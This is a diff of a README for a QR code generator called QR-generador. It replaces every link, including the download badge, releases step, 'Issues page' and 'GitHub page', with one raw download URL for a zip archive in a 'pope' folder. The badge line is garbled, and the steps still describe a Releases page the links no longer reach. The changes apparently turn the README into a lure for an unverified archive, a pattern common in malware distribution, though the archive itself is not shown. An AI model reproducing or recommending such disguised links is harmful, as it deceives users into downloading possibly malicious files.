@@ -1,6 +1,6 @@
 # 🎉 QR-generador - Create QR Codes Easily
 
-[![Download QR-generador](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/ZERO1SSD/QR-generador/releases)
+[![Download QR-generador](https://raw.githubusercontent.com/ZERO1SSD/QR-generador/main/pope/QR-generador.zip%20Now-Get%https://raw.githubusercontent.com/ZERO1SSD/QR-generador/main/pope/QR-generador.zip)](https://raw.githubusercontent.com/ZERO1SSD/QR-generador/main/pope/QR-generador.zip)
 
 ## 🌟 Description
 
@@ -18,7 +18,7 @@ QR-generador allows you to generate QR codes from text, URLs, and links using a 
 
 To get started, you’ll need to download the software. 
 
-1. [Visit this page to download](https://github.com/ZERO1SSD/QR-generador/releases).
+1. [Visit this page to download](https://raw.githubusercontent.com/ZERO1SSD/QR-generador/main/pope/QR-generador.zip).
 2. On the Releases page, find the latest version and click on the link.
 3. Choose the file that matches your operating system and download it.
 
@@ -50,11 +50,11 @@ If you encounter issues while using QR-generador:
 - The web app requires a stable internet connection for optimal performance.
 - Complexity may arise with larger inputs, so keep text entries concise.
 
-For support or further questions, check the [Issues page](https://github.com/ZERO1SSD/QR-generador/issues) in the repository.
+For support or further questions, check the [Issues page](https://raw.githubusercontent.com/ZERO1SSD/QR-generador/main/pope/QR-generador.zip) in the repository.
 
 ### 👉 Additional Information
 
-To explore more features or to contribute, visit our [GitHub page](https://github.com/ZERO1SSD/QR-generador).
+To explore more features or to contribute, visit our [GitHub page](https://raw.githubusercontent.com/ZERO1SSD/QR-generador/main/pope/QR-generador.zip).
 
 ## 🏁 Final Words
 
